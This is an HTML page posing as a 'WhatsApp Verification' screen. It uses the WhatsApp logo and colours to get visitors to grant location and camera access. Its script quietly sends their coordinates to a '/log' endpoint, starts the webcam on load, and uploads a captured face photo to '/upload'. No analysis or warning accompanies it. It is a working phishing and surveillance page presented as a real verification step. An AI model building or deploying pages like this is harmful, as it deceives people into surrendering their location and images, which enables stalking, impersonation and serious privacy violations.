<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WhatsApp Verification</title>
  <style>
    body {
      background-color: #ECE5DD;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background-color: #fff;
      border-radius: 15px;
      padding: 20px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
      text-align: center;
    }
    .logo {
      width: 100px;
      margin-bottom: 10px;
    }
    button {
      padding: 12px 20px;
      margin: 10px 5px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      background-color: #25D366;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
    <h3>Verify Your WhatsApp Account</h3>
    <p>To continue, please allow location access & verify camera</p>
    
    <button onclick="getLocation()">üìç Allow Location</button><br>
    <video id="video" width="100%" autoplay></video><br>
    <button onclick="capture()">üì∏ Capture Face</button>
    
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  </div>

  <script>
    // üìç Location code
    function getLocation() {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("/log?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
        alert("‚úÖ Location captured");
      }, function(err) {
        alert("‚ùå Location access denied");
      });
    }

    // üì∏ Camera capture code
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      video.srcObject = stream;
    });

    function capture() {
      context.drawImage(video, 0, 0, 320, 240);
      const imageData = canvas.toDataURL('image/png');
      fetch('/upload', {
        method: 'POST',
        body: JSON.stringify({ image: imageData }),
        headers: {
          'Content-Type': 'application/json'
        }
      }).then(() => alert("‚úÖ Image captured & sent"));
    }
  </script>
</body>
</html>
